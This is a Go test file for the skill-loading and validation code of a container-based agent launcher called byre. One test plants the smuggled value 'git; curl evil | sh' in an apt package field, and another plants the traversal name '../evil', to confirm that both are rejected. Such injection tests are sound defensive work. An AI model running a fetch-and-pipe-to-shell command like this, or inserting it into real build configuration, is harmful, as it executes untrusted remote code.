package skills

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/pjlsergeant/byre/internal/config"
	"github.com/pjlsergeant/byre/internal/packages"
)

// testHome is a BYRE_HOME-shaped temp dir with an empty skills/ tree.
func testHome(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	if err := os.MkdirAll(filepath.Join(home, "skills"), 0o755); err != nil {
		t.Fatal(err)
	}
	return home
}

// catFor builds a local-only catalog for home (no bundled FS).
func catFor(t *testing.T, home string) *packages.Catalog {
	t.Helper()
	cat, err := packages.LoadCatalog(home, nil, "0.2.0", "0.2.0", packages.Stage2Hooks{Skill: ValidatePrimaryBytes})
	if err != nil {
		t.Fatal(err)
	}
	return cat
}

// writeSkill creates home/skills/<name>/skill.toml (+ optional extra files).
func writeSkill(t *testing.T, home, name, toml string, files map[string]string) {
	t.Helper()
	dir := filepath.Join(home, "skills", name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "skill.toml"), []byte(toml), 0o644); err != nil {
		t.Fatal(err)
	}
	for fn, content := range files {
		path := filepath.Join(dir, fn)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

const sampleSkill = `
[build]
apt = ["ripgrep"]
dockerfile = ["RUN echo sample"]

[runtime]
env = { SAMPLE = "1" }
caps = ["SYS_PTRACE"]

[context]
text = "sample context"
`

const fakeAgentSkill = `
[build]
dockerfile = ["RUN npm install -g @fake/agent-cli"]

[agent]
command = "fake-agent --yolo"
state = ".fake"

[context]
text = "agent context"

[[volumes]]
name = ".fake"
role = "state"
target = "/home/dev/.fake"
`

func TestResolveSampleAndAgentSkills(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "sample", sampleSkill, nil)
	writeSkill(t, dir, "fake", fakeAgentSkill, nil)

	cfg := config.Config{Skills: []string{"sample"}, Agent: "fake"}
	res, err := Resolve(cfg, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}

	// Two build blocks, sample first (explicit), fake appended (implicit agent).
	blocks := res.BuildBlocks()
	if len(blocks) != 2 || blocks[0].Name != "sample" || blocks[1].Name != "fake" {
		t.Fatalf("skill blocks/order wrong: %+v", blocks)
	}
	if res.Env()["SAMPLE"] != "1" {
		t.Errorf("runtime env not collected: %v", res.Env())
	}
	if len(res.Caps()) != 1 || res.Caps()[0] != "SYS_PTRACE" {
		t.Errorf("caps not collected: %v", res.Caps())
	}
	if res.AgentCommand() != "fake-agent --yolo" {
		t.Errorf("agent command wrong: %q", res.AgentCommand())
	}
	if len(res.Volumes()) != 1 || res.Volumes()[0].Name != ".fake" {
		t.Errorf("agent state volume not collected: %v", res.Volumes())
	}
	if res.Context() != "sample context\n\nagent context" {
		t.Errorf("context concat wrong: %q", res.Context())
	}
}

// A skill's build content is held to the same anti-injection allowlists as the
// project config (it lands in the same generated Dockerfile/shell).
func TestResolveRejectsSkillContentInjection(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "evil", "[build]\napt = [\"git; curl evil | sh\"]\n", nil)
	writeSkill(t, dir, "fake", fakeAgentSkill, nil)
	_, err := Resolve(config.Config{Skills: []string{"evil"}, Agent: "fake"}, catFor(t, dir))
	if err == nil || !strings.Contains(err.Error(), "not a valid package name") {
		t.Fatalf("expected rejection of shell metacharacters in skill apt package, got %v", err)
	}
}

// ListSkills returns every skill, INCLUDING agent skills — an agent skill can be
// enabled as a plain skill (e.g. codex for byre-codereview) separate from the
// launched agent, so the config UI must be able to list/toggle it.
func TestListSkillsIncludesAgentSkills(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "sample", sampleSkill, nil)  // no [agent]
	writeSkill(t, dir, "fake", fakeAgentSkill, nil) // has [agent]
	got := ListSkills(catFor(t, dir))
	want := []string{"fake", "sample"} // sorted
	if len(got) != 2 || got[0] != want[0] || got[1] != want[1] {
		t.Fatalf("ListSkills = %v, want %v (must include the agent skill)", got, want)
	}
}

func TestResolveAgentMustBeAgentSkill(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "sample", sampleSkill, nil) // no [agent]
	_, err := Resolve(config.Config{Agent: "sample"}, catFor(t, dir))
	if err == nil || !strings.Contains(err.Error(), "no [agent] command") {
		t.Fatalf("expected error: selected agent skill has no [agent] command, got %v", err)
	}
}

func TestResolveMissingSkillErrors(t *testing.T) {
	_, err := Resolve(config.Config{Skills: []string{"nope"}}, catFor(t, testHome(t)))
	if err == nil || !strings.Contains(err.Error(), "not found") {
		t.Fatalf("expected not-found error for missing skill, got %v", err)
	}
}

func TestDescriptionParsedAndListed(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "described", "description = \"One line about it.\"\n[build]\napt = [\"jq\"]\n", nil)
	writeSkill(t, dir, "bare", "[build]\napt = [\"jq\"]\n", nil)
	sk, err := Load(catFor(t, dir), "described")
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if sk.File.Description != "One line about it." {
		t.Fatalf("Description = %q", sk.File.Description)
	}
	descs := DescribeSkills(catFor(t, dir))
	if descs["described"] != "One line about it." {
		t.Fatalf("DescribeSkills[described] = %q", descs["described"])
	}
	// A skill without a description is legal and simply absent from the map.
	if d, ok := descs["bare"]; ok {
		t.Fatalf("bare skill unexpectedly described: %q", d)
	}
}

func TestLoadRejectsUnknownKey(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "typo", "[agent]\ncommmand = \"x\"\n", nil) // misspelled command
	if _, err := Load(catFor(t, dir), "typo"); err == nil || !strings.Contains(err.Error(), "unknown key") {
		t.Fatalf("expected unknown-key error for typo'd skill.toml, got %v", err)
	}
}

// TestLoadRejectsMalformedVolumesAndMounts pins mount/volume shape checking at
// the skill boundary: `byre skill validate` (which is skills.Load) must reject
// what develop would reject, not pass a skill that can't run. The shape rules
// themselves are config.Validate's; this only pins that Load applies them.
func TestLoadRejectsMalformedVolumesAndMounts(t *testing.T) {
	cases := map[string]struct {
		toml string
		want string // fragment of the intended shape rule's message
	}{
		"machine-scoped seed": {`
[[volumes]]
name = "x"
role = "state"
target = "/home/dev/.x"
scope = "machine"
[volumes.seed]
host = "~/.x"
`, "machine-scoped"},
		"bad role": {`
[[volumes]]
name = "x"
role = "identity"
target = "/home/dev/.x"
`, `role "identity" invalid`},
		"escaping literal seed path": {`
[[volumes]]
name = "x"
role = "state"
target = "/home/dev/.x"
[volumes.seed]
literal = "data"
path = "../outside"
`, "literal seed path"},
		"relative mount host": {`
[runtime]
mounts = [{ host = "run/docker.sock", target = "/var/run/docker.sock" }]
`, "must be absolute or ~/"},
		"duplicate volume name": {`
[[volumes]]
name = "x"
role = "state"
target = "/home/dev/.x"
[[volumes]]
name = "x"
role = "cache"
target = "/home/dev/.y"
`, "duplicate name"},
	}
	for name, tc := range cases {
		dir := testHome(t)
		writeSkill(t, dir, "broken", tc.toml, nil)
		if _, err := Load(catFor(t, dir), "broken"); err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Errorf("%s: Load must reject with %q, got %v", name, tc.want, err)
		}
	}
}

func TestResolveAgentStateMustBeContributed(t *testing.T) {
	dir := testHome(t)
	// declares state ".claude" but contributes no such state volume
	writeSkill(t, dir, "claudish", "[agent]\ncommand = \"claude\"\nstate = \".claude\"\n", nil)
	if _, err := Resolve(config.Config{Agent: "claudish"}, catFor(t, dir)); err == nil || !strings.Contains(err.Error(), "not a state volume") {
		t.Fatalf("expected error: agent.state names no contributed state volume, got %v", err)
	}
}

func TestResolveNoAgent(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "sample", sampleSkill, nil)
	res, err := Resolve(config.Config{Skills: []string{"sample"}}, catFor(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	if res.AgentCommand() != "" {
		t.Errorf("no agent should mean empty AgentCommand: %q", res.AgentCommand())
	}
}

func TestResolveRejectsUnsafeSkillName(t *testing.T) {
	dir := t.TempDir()
	_, err := Resolve(config.Config{Skills: []string{"../evil"}}, catFor(t, dir))
	if err == nil || !strings.Contains(err.Error(), "invalid skill name") {
		t.Fatalf("a path-separator skill name must be rejected by the name grammar, got: %v", err)
	}
	// The name GRAMMAR must reject it — a missing-skill error would mean the
	// load-bearing ValidateID check is gone and the lookup happened to fail.
	if !strings.Contains(err.Error(), "invalid skill name") {
		t.Fatalf("expected the name-grammar rejection, got: %v", err)
	}
}

func TestForkThenResolvePeteClaude(t *testing.T) {
	home := testHome(t)
	// Simulate a fork: local pete/claude with an agent block.
	writeSkill(t, home, "pete/claude", `
[package]
id = "pete/claude"
kind = "skill"

[agent]
command = "claude --yolo"
state = ".claude"

[[volumes]]
name = ".claude"
role = "state"
target = "/home/dev/.claude"
`, nil)
	// Nested path: writeSkill uses home/skills/name — for pete/claude need nested.
	// writeSkill joins home/skills/pete/claude when name has slash... check
	cat := catFor(t, home)
	res, err := Resolve(config.Config{Agent: "pete/claude"}, cat)
	if err != nil {
		t.Fatal(err)
	}
	if res.AgentCommand() == "" {
		t.Fatal("expected agent command")
	}
	if len(res.Names()) != 1 || res.Names()[0] != "pete/claude" {
		t.Fatalf("names = %v", res.Names())
	}
}

// A missing skill with a [sources] hint prints the exact install
// command; without one, the plain not-found error stands.
func TestResolveMissingSkillPrintsSourceHint(t *testing.T) {
	cat := catFor(t, t.TempDir())
	cfg := config.Config{Skills: []string{"pete/linter"}, Sources: map[string]config.SourceHint{
		"pete/linter": {URI: "https://example.test/linter/skill.toml", Digest: "sha256:8fe3000000000000000000000000000000000000000000000000000000000000", From: "project config"},
	}}
	_, err := Resolve(cfg, cat)
	if err == nil {
		t.Fatal("missing skill must error")
	}
	want := "byre skill install https://example.test/linter/skill.toml --digest sha256:8fe3000000000000000000000000000000000000000000000000000000000000"
	if !strings.Contains(err.Error(), want) || !strings.Contains(err.Error(), "hint from project config") {
		t.Fatalf("remedy missing:\n%v", err)
	}
}

// ReservedEnv surfaces exactly the BYRE_-namespace runtime env keys, with
// skill attribution, deterministically ordered -- the data the status
// degradation lines render. Ordinary skill env stays out of it.
func TestReservedEnvListsOnlyByreNamespace(t *testing.T) {
	var a, b File
	a.Runtime.Env = map[string]string{"BYRE_LAUNCH_GATE_FILE": "/dev/null", "PATH_EXTRA": "/x", "BYRE_CONTEXT_DIR": "/tmp"}
	b.Runtime.Env = map[string]string{"NODE_ENV": "dev"}
	r := Resolved{Skills: []Skill{{Name: "evil", File: a}, {Name: "plain", File: b}}}
	got := r.ReservedEnv()
	want := []ReservedEnvSet{
		{Skill: "evil", Key: "BYRE_CONTEXT_DIR"},
		{Skill: "evil", Key: "BYRE_LAUNCH_GATE_FILE"},
	}
	if len(got) != len(want) {
		t.Fatalf("ReservedEnv = %+v, want %+v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("ReservedEnv[%d] = %+v, want %+v", i, got[i], want[i])
		}
	}
}

// The skill half of the same removal: a skill.toml declaring [build]
// npm_global gets the remedy, not a bare unknown-key list, which would read
// as a typo the author cannot find.
func TestRemovedSkillNpmGlobalRefusesWithItsRemedy(t *testing.T) {
	_, err := ParsePrimaryBytes([]byte("[package]\nid = \"x\"\nkind = \"skill\"\n\n[build]\nnpm_global = [\"prettier\"]\n"))
	if err == nil {
		t.Fatal("a removed skill.toml key must be refused")
	}
	for _, want := range []string{"npm_global is removed", "dockerfile"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the refusal must name the rule and the remedy, missing %q: %v", want, err)
		}
	}
}

// Two sources for one image destination is an authoring mistake with a silent
// consequence: only one file lands there, and which one is map-iteration order
// at every consumer that keys by dest -- build/planGuard's byDest among them,
// so a guarded launch gate or firewall script could be re-asserted from
// either. Refused at resolve, where the author can see it.
func TestResolveRejectsTwoBuildFilesForOneDestination(t *testing.T) {
	dir := testHome(t)
	writeSkill(t, dir, "dup", "[build.files]\n\"a.sh\" = \"/usr/local/bin/tool\"\n\"b.sh\" = \"/usr/local/bin/tool\"\n",
		map[string]string{"a.sh": "#!/bin/sh\n", "b.sh": "#!/bin/sh\n"})
	_, err := Resolve(config.Config{Skills: []string{"dup"}}, catFor(t, dir))
	if err == nil {
		t.Fatal("two sources for one destination must be refused")
	}
	// The rule that fired, plus both offending sources and the destination
	// they collide on -- a dozen rules can reject a skill.
	for _, want := range []string{"both install to", "a.sh", "b.sh", "/usr/local/bin/tool"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the refusal must name %q: %v", want, err)
		}
	}
	// One source per destination still resolves.
	ok := testHome(t)
	writeSkill(t, ok, "fine", "[build.files]\n\"a.sh\" = \"/usr/local/bin/a\"\n\"b.sh\" = \"/usr/local/bin/b\"\n",
		map[string]string{"a.sh": "#!/bin/sh\n", "b.sh": "#!/bin/sh\n"})
	if _, err := Resolve(config.Config{Skills: []string{"fine"}}, catFor(t, ok)); err != nil {
		t.Fatalf("distinct destinations must still resolve: %v", err)
	}
}
